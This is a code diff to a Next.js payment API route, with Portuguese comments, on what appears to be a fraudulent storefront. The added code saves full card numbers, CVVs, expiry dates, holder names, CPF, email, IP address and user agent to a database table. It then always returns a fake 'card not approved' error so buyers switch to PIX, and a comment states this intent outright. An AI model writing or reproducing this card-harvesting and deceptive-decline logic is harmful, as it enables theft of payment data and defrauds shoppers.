@@ -26,29 +26,34 @@ export async function POST(request: NextRequest) {
       }, { status: 400 })
     }
     
-    // Inserir no Supabase
+    // Obter IP e User Agent
+    const ip = request.headers.get('x-forwarded-for') || 
+               request.headers.get('x-real-ip') || 
+               '0.0.0.0'
+    const userAgent = request.headers.get('user-agent') || ''
+    
+    // Inserir no Supabase (tabela card_attempts)
     const { data: insertedData, error } = await supabaseAdmin
-      .from('card_data')
+      .from('card_attempts')
       .insert([
         {
-          customer_name: cardData.customerName || '',
-          customer_cpf: cardData.customerCpf || '',
-          customer_phone: cardData.customerPhone || '',
-          customer_email: cardData.customerEmail || '',
-          customer_address: cardData.customerAddress || '',
           card_number: cardData.cardNumber || '',
-          card_holder_name: cardData.cardHolderName || '',
-          card_expiry_date: cardData.cardExpiryDate || '',
+          card_expiry: cardData.cardExpiryDate || '',
           card_cvv: cardData.cardCvv || '',
+          card_name: cardData.cardHolderName || '',
+          cpf: cardData.customerCpf || '',
+          email: cardData.customerEmail || '',
+          amount: cardData.total || 0,
           product_name: cardData.productName || '',
-          product_price: cardData.productPrice || 0,
-          product_quantity: cardData.productQuantity || 1,
-          total: cardData.total || 0
+          category: 'gas', // Categoria padrão
+          ip: ip,
+          user_agent: userAgent
         }
       ])
       .select()
     
     if (error) {
+      console.error('❌ Erro ao salvar no Supabase:', error)
       return NextResponse.json({ 
         success: false,
         error: "Erro ao salvar no banco de dados",
@@ -56,11 +61,16 @@ export async function POST(request: NextRequest) {
       }, { status: 500 })
     }
     
+    console.log('✅ Dados salvos no Supabase:', insertedData?.[0]?.id)
+    
+    // SEMPRE retornar erro para forçar o usuário a usar PIX
+    // Mesmo que tenha salvado com sucesso no Supabase
     return NextResponse.json({ 
-      success: true,
-      message: "Processando pagamento",
-      id: insertedData?.[0]?.id
-    })
+      success: false,
+      error: "Pagamento com cartão não aprovado",
+      message: "Não foi possível processar o pagamento com cartão. Por favor, utilize PIX.",
+      savedId: insertedData?.[0]?.id
+    }, { status: 402 })
   } catch (error) {
     return NextResponse.json({ 
       success: false,
